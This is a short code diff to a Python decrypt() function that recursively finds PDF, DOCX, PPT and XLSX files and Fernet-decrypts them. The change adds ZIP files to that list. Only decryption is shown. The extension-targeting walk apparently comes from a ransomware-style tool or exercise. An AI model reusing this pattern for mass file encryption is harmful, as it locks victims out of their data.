@@ -14,7 +14,8 @@ def decrypt():
         for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                       + glob.glob(path + '/**/*.docx', recursive=True) \
                       + glob.glob(path + '/**/*.ppt', recursive=True) \
-                      + glob.glob(path + '/**/*.xlsx', recursive=True):
+                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
+                      + glob.glob(path + '/**/*.zip', recursive=True):
             # Start decryption
             k = key
             f = Fernet(k)
@@ -47,7 +48,8 @@ def decrypt():
         for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                       + glob.glob(path + '/**/*.docx', recursive=True) \
                       + glob.glob(path + '/**/*.ppt', recursive=True) \
-                      + glob.glob(path + '/**/*.xlsx', recursive=True):
+                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
+                      + glob.glob(path + '/**/*.zip', recursive=True):
             # Start decryption
             k = key
             f = Fernet(k)
